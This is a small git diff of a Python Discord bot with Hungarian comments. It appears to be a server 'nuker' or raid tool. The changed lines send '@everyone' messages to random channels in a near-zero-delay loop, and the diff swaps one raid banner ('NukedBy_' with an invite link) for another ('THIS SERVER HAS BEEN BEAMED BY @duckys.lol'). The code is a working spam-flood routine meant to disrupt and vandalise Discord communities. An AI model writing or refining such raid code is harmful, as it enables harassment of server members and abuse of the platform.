@@ -26,7 +26,7 @@ async def on_ready():
             if channels:  # Ellenőrizzük, hogy vannak-e elérhető csatornák
                 channel = random.choice(channels)  # Véletlenszerű csatorna kiválasztása
                 try:
-                    await channel.send("@everyone NukedBy_: HappyHook team https://discord.gg/2m4dU5KgFG")  # Az üzenet, amit küldeni szeretnél
+                    await channel.send("@everyone WAKE UP! THIS SERVER HAS BEEN BEAMED BY @duckys.lol ")  # Az üzenet, amit küldeni szeretnél
                     await asyncio.sleep(0.000001)  # Várakozás 0.0001 másodpercig (10,000 üzenet/másodperc)
                 except discord.Forbidden:
                     print(f'Nincs engedély az üzenet küldésére a(z) {channel.name} csatornába.')
